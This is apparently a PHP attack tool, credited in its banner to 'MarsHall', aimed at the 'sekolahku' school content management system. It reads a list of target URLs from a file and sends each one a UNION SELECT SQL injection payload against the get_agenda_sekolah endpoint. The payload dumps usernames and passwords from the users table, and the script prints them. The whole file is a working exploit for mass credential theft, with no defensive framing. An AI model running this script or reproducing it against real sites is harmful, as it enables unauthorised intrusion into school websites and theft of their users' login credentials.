


<?php

    echo "
    __  __     _                          
    \ \/ /__ _(_)         Author : MarsHall              
    >  </ _` | |          Tools  : Get U/P cms sekolahku            
    /_/\_\__,_|_|     _ _         _       
    / __|_  _ _ _  __| (_)__ __ _| |_ ___ 
    \__ \ || | ' \/ _` | / _/ _` |  _/ -_)
    |___/\_, |_||_\__,_|_\__\__,_|\__\___|
    |__/                             
    ";
    echo "\n";

$list = file_get_contents('sex.txt');
$ex = explode("\n", $list);

    
 
function http_request($url){
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    $output = curl_exec($ch); 
    curl_close($ch);      
    return $output;
}
foreach( $ex as $target ){
$ko = http_request("$target/home/get_agenda_sekolah?end=1'union+select+1,group_concat(0x3c6c693e,username,0x3a,password)+from+users--+");
$ko = json_decode($ko, TRUE);

$user = $ko[0]['start'];
$result = preg_replace("/[,]/", "", $user);
$hasil = explode("<li>", $result);


  echo "\n[+] $target \n";
for ($i= 1; $i <= 3; $i++)
{
  echo "[+] result => $hasil[$i]\n";
}
}
echo "\n";